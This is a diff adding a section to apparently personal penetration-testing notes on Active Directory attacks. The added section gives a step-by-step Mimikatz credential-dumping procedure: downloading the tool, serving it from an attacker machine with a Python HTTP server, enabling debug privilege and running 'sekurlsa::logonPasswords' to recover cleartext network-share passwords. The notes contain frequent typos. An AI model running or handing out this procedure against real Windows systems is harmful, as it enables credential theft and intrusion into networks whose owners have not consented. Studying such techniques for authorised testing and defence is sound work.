@@ -217,3 +217,19 @@ Mitigation is to patch (KB2962486) and elete the old GPP XML
 
 Tool used to view and steal credentials, generate Kerberos tickets
 Dump credentials stored in memory.
+
+## Credential Dumping with Mimikatz
+
+Use gentelkimi mimikatz on github to download latest realese zip file
+
+If downloaded from attacker machine, open http server to download from local user on user workstation having an access to the network share
+python3 -m http.server 80
+
+On win machine, open command prompt as admin, go to the folder where you uploade mimikatz and execute executable
+We start by setting the privilege mod to debug:
+privilege:: //enter to see what is available
+privilege::debug // debug enables to realize all attacks that we want
+sekurlsa:: // show all available features
+sekurlsa::logonPasswords
+
+Using this option we get a clear password for the networkn share auomatic connection
